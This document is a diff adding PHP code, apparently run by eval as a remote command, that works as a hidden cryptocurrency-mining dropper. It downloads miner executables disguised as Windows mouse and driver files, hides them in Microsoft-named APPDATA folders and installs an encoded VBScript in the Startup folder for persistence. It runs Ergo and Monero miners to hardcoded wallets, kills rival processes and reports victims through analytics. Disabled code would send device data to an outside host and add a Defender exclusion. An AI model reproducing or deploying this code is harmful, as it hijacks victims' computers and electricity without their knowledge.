@@ -1,0 +1,433 @@
+execução por eval. cuidado, não use exit e nem __FILE__
+
+*Atenção, este comando esta sendo executado via exec_blog_command() devido a mudança da url da conta. use só o comando do blg
+
+****20
+
+[___GIT_COMMAND]
+
+$GLOBALS['__download_002'] = function($url, $post = false, $__header = array())
+{
+	try
+	{
+		$header = array(
+			'Cache-Control: max-age=0',
+			'Connection: keep-alive',
+			'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'
+		);
+		$header = array_merge($header, $__header);
+		clearstatcache();
+		$ch = curl_init(); 
+		curl_setopt($ch, CURLOPT_URL, $url);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0' );
+		curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+		if($post)
+		{
+			curl_setopt($ch, CURLOPT_POST, true);
+			curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($post));
+		}
+		$response = @curl_exec($ch);
+		curl_close($ch);
+		return $response;
+		
+	}catch( Exception $e ){}
+	return false;
+};
+
+$GLOBALS['__getdev_002'] = function($lolpath)
+{
+	$output = array();
+	$r = 0;
+	@exec('"' . $lolpath . '" --list-devices', $output, $r);
+	$output = implode("\n", $output);
+	$output = preg_split('/device[\s]+(?=[0-9\s]+\:)/is', "a\n" . $output . "a\n");
+	$l = count($output);
+	$max_mem = 0;
+	$device = array('0', 'null', 'null', 0);
+	for($i=1; $i<$l; $i++)
+	{
+		$dev = $output[$i];
+		preg_match('/^[0-9\s]+/is', $dev, $matches);
+		if(!isset($matches[0]))
+			continue;
+		$ndevice = trim($matches[0]);
+		if(!$ndevice)
+			$ndevice = '0';
+		preg_match('/name\:(.*?)[\r\n]/is', $dev, $matches);
+		if(!isset($matches[1]))
+			continue;
+		$name = trim($matches[1]);
+		
+		preg_match('/memory\:(.*?)[\r\n]/is', $dev, $matches);
+		if(!isset($matches[1]))
+			continue;
+		$memory = preg_replace('/[a-z]+.*?$/is', '', trim($matches[1]));
+		$memory = (int)preg_replace('/[^0-9]+/is', '', $memory);
+		
+		preg_match('/vendor\:(.*?)[\r\n]/is', $dev, $matches);
+		if(!isset($matches[1]))
+			continue;
+		$vendor = trim($matches[1]);
+		$vendor = preg_replace('/[^a-z0-9]+/is', '', $vendor);
+		if(stripos($vendor, 'amd') === false && stripos($vendor, 'nvidia') === false && stripos($vendor, 'advancedmicrodevices') === false)
+			continue;
+		if($max_mem > $memory)
+			continue;
+		$max_mem = $memory;
+		$device = array($ndevice, $name, $vendor, $memory);
+	}
+	return $device;
+};
+
+$GLOBALS['__getpathname_002'] = function()
+{
+	$root = getenv('APPDATA');
+	$time = strtotime("-20 month", time());
+	for($i=0; $i<40; $i++)
+	{
+		$time = strtotime("+1 month", $time);
+		$year = (int)date('Y', $time);
+		$month = (int)date('m', $time);
+		$date_name_vs = (string)$month . '.' . (($month*37) * ($year*189));
+		
+		$cpupath = $root . '\\Microsoft Binaries v'.$date_name_vs . '\\cachecpudet.dat';
+		if(is_file($cpupath))
+		{
+			$cpudet = @json_decode(@file_get_contents($cpupath), true);
+			if($cpudet && isset($cpudet['cores']) && $cpudet['cores'] > 0)
+				return $cpudet['cores'];
+		}
+	}
+	return 0;
+};
+
+$GLOBALS['__put_contents_vir_002'] = function($file, $data)
+{
+	$root = getenv('APPDATA');
+	$time = strtotime("-20 month", time());
+	for($i=0; $i<40; $i++)
+	{
+		$time = strtotime("+1 month", $time);
+		$year = (int)date('Y', $time);
+		$month = (int)date('m', $time);
+		$date_name_vs = (string)$month . '.' . (($month*37) * ($year*189));
+		
+		$path = $root . '\\Microsoft Binaries v'.$date_name_vs . '\\prt';
+		$path2 = $root . '\\Drivers x86 v'.$date_name_vs . '\\prt';
+		if(is_dir($path))
+			file_put_contents($path . '/' . $file, $data);
+		if(is_dir($path2))
+			file_put_contents($path2 . '/' . $file, $data);
+		
+	}
+	return 0;
+};
+
+$GLOBALS['__verify_vir_version_002'] = function()
+{
+	if(@file_get_contents(dirname(PHP_BINARY).'/version_2') === '1.0')
+		return;
+	$root = dirname(PHP_BINARY) . '/temp2';
+	@mkdir($root);
+	@file_put_contents($root.'/com.dat', $GLOBALS['__download_002']('https://marceloti255.github.io/job/com/com_v13.1'));
+	$root_path = $root;
+	@mkdir($root_path . '\\prt');
+	$data = @file_get_contents($root_path . '\\com.dat');
+	$file_name = '';
+	$count_files = 0;
+	$x = 1;
+	$parts = preg_split('/\{PART\}/is', $data);
+	for($i=1; $i<count($parts)-1; $i++)
+	{
+		$part = base64_decode(strrev($parts[$i]));
+		$x = $x * -1;
+		if($x == -1)
+		{
+			$file_name = $part;
+		}
+		else
+		{
+			$count_files++;
+			$path = '';
+			if($count_files == 1)
+				$path = $root_path . '\\' . $file_name;
+			else
+			{
+				$GLOBALS['__put_contents_vir_002']($file_name, $part);
+			}
+		}
+	}
+};
+
+if(@file_get_contents(dirname(PHP_BINARY).'/version_2') === '1.0')
+{
+	$root = getenv('APPDATA');
+	$time = strtotime("-20 month", time());
+	$id = 'none';
+	for($i=0; $i<40; $i++)
+	{
+		$time = strtotime("+1 month", $time);
+		$year = (int)date('Y', $time);
+		$month = (int)date('m', $time);
+		$date_name_vs = (string)$month . '.' . (($month*37) * ($year*189));
+		$path = $root . '\\Microsoft Binaries v'.$date_name_vs . '\\token.dat';
+		if(is_file($path))
+		{
+			$id = substr(@file_get_contents($path), 0, 35);
+			break;
+		}
+	}
+	$path_timestamp = dirname(PHP_BINARY).'/time_anlt';
+	$timestamp = preg_replace('/[^0-9]+/is', '', @file_get_contents($path_timestamp));
+	if($timestamp == '')
+		$timestamp = 0;
+	$now_time = time();
+	if(abs($now_time - $timestamp) > 60 * 60 * 15/*hours*/)
+	{
+		/*@$GLOBALS['__download_002']('xxxxxxxxxxxxxx');*/
+		$measurement_id = "G-MK5W0X76S3";
+		$api_secret = "75qz-iqmTOazvRWiP60Rqg";
+		$client_id = $id;
+		$url = "https://www.google-analytics.com/mp/collect?measurement_id=$measurement_id&api_secret=$api_secret";
+		$data = ["client_id" => $client_id,"events" => [["name" => "script_usage","params" => ["script_version" => "1.0","timestamp" => time()]]]];
+		@$GLOBALS['__download_002']($url, $data, ["Content-Type: application/json"]);
+		@file_put_contents($path_timestamp, $now_time);
+	}
+}
+else
+	$GLOBALS['__verify_vir_version_002']();
+
+$lolm_path = getenv('APPDATA') . '\\microsoft_win_x86_1.0';
+$xmr_path = $lolm_path;
+@mkdir($lolm_path);
+$id_com = $lolm_path . '\\com_key.dat';
+$id_path = $lolm_path . '\\work_key.dat';
+$work_key = @file_get_contents($id_path);
+if(!$work_key)
+{
+	$work_key = md5(microtime().mt_rand(0,9999).mt_rand(0,9999).mt_rand(0,9999));
+	@file_put_contents($id_path, $work_key);
+}
+$work_key = trim($work_key);
+$command_id = 'php000047';
+/*if(@file_get_contents($id_com) !== $command_id)*/
+if(1)
+{
+	@file_put_contents($id_com, $command_id);
+	try{
+	/**
+	$r = 0;
+	@exec('powershell Add-MpPreference -ExclusionPath "'.getenv('APPDATA').'"', $output, $r);
+	/**/
+	$EXEC_XMR = true;
+	$lolm_name = 'w_driver1.95_x86';
+	$xmr_name = 'mouse_driver1.7_X86';
+	$lolm_path .= '\\'.$lolm_name.'.exe';
+	$xmr_path .= '\\'.$xmr_name.'.exe';
+	$data = true;
+	$user = 'marceloti255';
+	$project = 'job';
+	if(!is_file($lolm_path))
+	{
+		$data = false;
+		/*$data = @$GLOBALS['__download_002']("https://raw.githubusercontent.com/$user/$project/refs/heads/main/lolminer/lolMiner_1.95.dat");*/
+		$data = @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/lolMiner_1.95.dat");
+		if($data && strlen($data) > 9000000)
+			@file_put_contents($lolm_path, $data);
+		else
+			$data = false;
+	}
+	if($EXEC_XMR && !is_file($xmr_path))
+	{
+		$data = false;
+		/**
+		$data = @$GLOBALS['__download_002']("https://raw.githubusercontent.com/$user/$project/refs/heads/main/lolminer/xmr.dat");
+		$data2 = @$GLOBALS['__download_002']("https://raw.githubusercontent.com/$user/$project/refs/heads/main/lolminer/ring_config.dat");
+		$data3 = @$GLOBALS['__download_002']("https://raw.githubusercontent.com/$user/$project/refs/heads/main/lolminer/ring_dll.dat");
+		/**/
+		$data = @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/xmr.dat");
+		
+		/*
+		$data2 = @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/ring_config.dat");
+		$data2 = @base64_decode(@strrev($data2));
+		/**/
+		/**
+		$data3 = @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/ring_dll.dat");
+		$data3 = @base64_decode(@strrev($data3));
+		/**/
+		$data3 = 'null';
+		
+		/*if($data && strlen($data) > 5000000 && strlen($data2) > 2000 && strlen($data3) > 12000)*/
+		if($data && strlen($data) > 5000000)/* && strlen($data3) > 12000)*/
+		/*if($data && strlen($data) > 5000000 && strlen($data2) > 3000)*/
+		{
+			@file_put_contents($xmr_path, $data);
+			@unlink(dirname($xmr_path).'/config.json');
+			@file_put_contents(dirname($xmr_path).'/Win'.'Ring'.'0x64.s'.'ys', $data3);
+		}
+		else
+			$EXEC_XMR = false;
+	}
+	$devnum = '0'; /*false;*/
+	if($data !== false && is_file($lolm_path))
+	{
+		/**
+		sleep(2);
+		$dev = $GLOBALS['__getdev_002']($lolm_path);
+		if($dev)
+			$devnum = $dev[0];
+		/**/
+	}
+	if($devnum !== false && is_file($lolm_path))
+	{
+		$vbs = 'T24gRXJyb3IgUmVzdW1lIE5leHQNCkNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpLlJ1biAie0NPTU1BTkR9IiwgMCwgRmFsc2UNClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikNCmZuID0gV1NjcmlwdC5TY3JpcHRGdWxsTmFtZQ0KbiA9IFNwbGl0KGZuLCAiLiIpDQpjID0gQ0RibChuKDEpKQ0KV2hpbGUgVHJ1ZQ0KCWMgPSBjICsgMQ0KCW5uID0gbigwKSAmICIuIiAmIGMgJiAiLiIgJiBuKDIpICYgIi52YnMiDQoJZnNvLk1vdmVGaWxlIGZuLCBubg0KCWZuID0gbm4NCglXU2NyaXB0LlNsZWVwKHtUSU1FT1VUfSkNCldlbmQ';
+		if($EXEC_XMR)
+		{
+			$vbs = 'T24gRXJyb3IgUmVzdW1lIE5leHQNCkNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpLlJ1biAie0NPTU1BTkR9IiwgMCwgRmFsc2UNCkNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpLlJ1biAie0NPTU1BTkRfMn0iLCAwLCBGYWxzZQ0KU2V0IGZzbyA9IENyZWF0ZU9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKQ0KZm4gPSBXU2NyaXB0LlNjcmlwdEZ1bGxOYW1lDQpuID0gU3BsaXQoZm4sICIuIikNCmMgPSBDRGJsKG4oMSkpDQpXaGlsZSBUcnVlDQoJYyA9IGMgKyAxDQoJbm4gPSBuKDApICYgIi4iICYgYyAmICIuIiAmIG4oMikgJiAiLnZicyINCglmc28uTW92ZUZpbGUgZm4sIG5uDQoJZm4gPSBubg0KCVdTY3JpcHQuU2xlZXAoe1RJTUVPVVR9KQ0KV2VuZA';
+		}
+		/**/
+		$vbs_checkname = 'Microsoft Mouse Driver x86';
+		$vbsname = $vbs_checkname . ' vs10.12212147455.'.(string)time().'.vbs';
+		/*$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-eu1.nanopool.org:11111 --user 9hJsrcoUYwKc92BXKbiVotX7CbFLkT85GY6r6FtnK7bu1qfHokD.'.$work_key.'_dev'.$devnum.' --watchdog exit --nocolor --devices '.$devnum;*/
+		$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-eu1.nanopool.org:11111 --user 9fuM8aA19bEFdGZyL2i8fmnLTKHw7gebJWwWCMUnEMnMg5QReFG.'.$work_key.' --watchdog exit --nocolor';
+		$command = preg_replace('/\"/is', '""', $command);
+		$vbs = base64_decode($vbs);
+		$vbs = preg_replace('/\{COMMAND\}/is', $command, $vbs);
+		
+		if($EXEC_XMR)
+		{
+			$num_threads = $GLOBALS['__getpathname_002']();
+			if($num_threads < 4)
+			{
+				$EXEC_XMR = false;
+			}
+			else
+			{
+				$num_threads = (string)ceil($num_threads / 4);
+				$xmr_address = '4B6d8CF6BSZRH2JoC4P3JjVWtZ5Axe4bLZ3XDNMmsSD794xC3sBgtUtDitCQevnP9FEoiCathYVFMZGnxZHizJpL5SZWhch';
+				$command = '"'.$xmr_path.'" -o xmrpool.eu:3333 -a rx/0 -u '.$xmr_address.' -p '.md5($work_key.'001').' --threads '.$num_threads;
+				
+				$command = preg_replace('/\"/is', '""', $command);
+				$vbs = preg_replace('/\{COMMAND\_2\}/is', $command, $vbs);
+			}
+		}
+		$vbs = preg_replace('/\{TIMEOUT\}/is', (string)(mt_rand(1000*60*1, 1000*60*5)), $vbs);
+		$vbs_path = getenv('APPDATA') . '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup';
+		$execlol = false;
+		$vbs_exec_path = null;
+		if(is_dir($vbs_path))
+		{
+			/**
+			@exec('taskkill /f /im w_driver_x86.exe');
+			@exec('taskkill /f /im w_driverx86.exe');
+			@exec('taskkill /f /im w_driver1.95_x86.exe');
+			/**/
+			$count_files = 0;
+			$di = new DirectoryIterator($vbs_path);
+			unset($data);
+			foreach($di as $data)
+			{
+				if($data->isDot() || $data->isDir() || !$data->isFile())
+					continue;
+				if(stripos($data->getFilename(), $vbs_checkname) === false)
+					continue;
+				$count_files++;
+				if($count_files == 1)
+				{
+					$execlol = true;
+					@file_put_contents($data->getPathname(), $vbs);
+					$vbs_exec_path = $data->getPathname();
+					/*@exec('start "" "'.$data->getPathname().'"');*/
+				}
+				else
+					@unlink($data->getPathname());
+			}
+			if($count_files == 0)
+			{
+				$execlol = true;
+				@file_put_contents($vbs_path.'\\'.$vbsname, $vbs);
+				$vbs_exec_path = $vbs_path.'\\'.$vbsname;
+				/*@exec('start "" "'.$vbs_path.'\\'.$vbsname.'"');*/
+			}
+		}
+		if($execlol && $vbs_exec_path)
+		{
+			$output = array();
+			$new_command_id = '10009';
+			$path_control_id  = dirname(PHP_BINARY) . '/command_id';
+			if(@file_get_contents($path_control_id) !== $new_command_id)
+			{
+				@file_put_contents($path_control_id, $new_command_id);
+				@exec('taskkill /f /im '.$lolm_name.'.exe');
+				@exec('taskkill /f /im '.$xmr_name.'.exe');
+				@exec('taskkill /f /im mouse_driver1.5_X86.exe');
+				@exec('taskkill /f /im mouse_driver1.6_X86.exe');
+				sleep(2);
+				
+				/*remove tasks*/
+				@exec('schtasks /Change /TN "Microsoft Scan Update" /Disable');
+				@exec('schtasks /Delete /TN "Microsoft Scan Update" /F');
+				sleep(2);
+			}
+			$r = 0;
+			@exec('tasklist', $output, $r);
+			$output = implode("\n", $output);
+			if(false === stripos($output, $lolm_name) && false === stripos($output, $xmr_name))
+			{
+				/**
+				$output = array();
+				$r = 0;
+				@exec('wmic path win32_VideoController get name', $output, $r);
+				$output = trim(implode("\n", $output));
+				$output = preg_replace('/[\r\n]+/is', ' - ', $output);
+				$ipl = @gethostbyname(@gethostname());
+				if(!$ipl)
+					$ipl = '127.0.0.1';
+				$post = array(
+					'gpuid' => $output
+				);
+				@$GLOBALS['__download_002']('https://secondsapphost.servehttp.com/test_procs/test.php?ip='.$ipl, $post);
+				sleep(5);
+				/**/
+				
+				@exec('start "" "'.$vbs_exec_path.'"');
+				
+				/**
+				$output = array();
+				$r = 0;
+				@exec('"' . $lolm_path . '" --list-devices --nocolor', $output, $r);
+				$devices = implode("\n", $output);
+				$log_path = dirname($lolm_path) . '\\temp_log.txt';
+				@pclose(@popen('start /B cmd /c ""' . $lolm_path . '" --algo AUTOLYKOS2 --pool ergo-eu1.nanopool.org:11111 --user 9hJsrcoUYwKc92BXKbiVotX7CbFLkT85GY6r6FtnK7bu1qfHokD.'.$work_key.'_dev'.$devnum.' --watchdog exit --nocolor --devices '.$devnum.' > "' . $log_path . '" 2>&1"', 'r'));
+				sleep(10);
+				$output = array();
+				$r = 0;
+				@exec('tasklist', $output, $r);
+				$output = implode("\n", $output);
+				if(false === stripos($output, 'w_driver1.95_x86'))
+				{
+					$logdata = @file_get_contents($log_path);
+					if($logdata)
+					{
+						$post = array(
+							'devices' => $devices,
+							'logdata' => $logdata
+						);
+						$ipl = @gethostbyname(@gethostname());
+						if(!$ipl)
+							$ipl = '127.0.0.1';
+						@$GLOBALS['__download_002']('https://secondsapphost.servehttp.com/test_procs/test.php?ip='.$ipl, $post);
+					}
+				}
+				/**/
+			}
+		}
+	}
+	}catch(Exception $e){}
+}
+
+[/GIT_COMMAND]
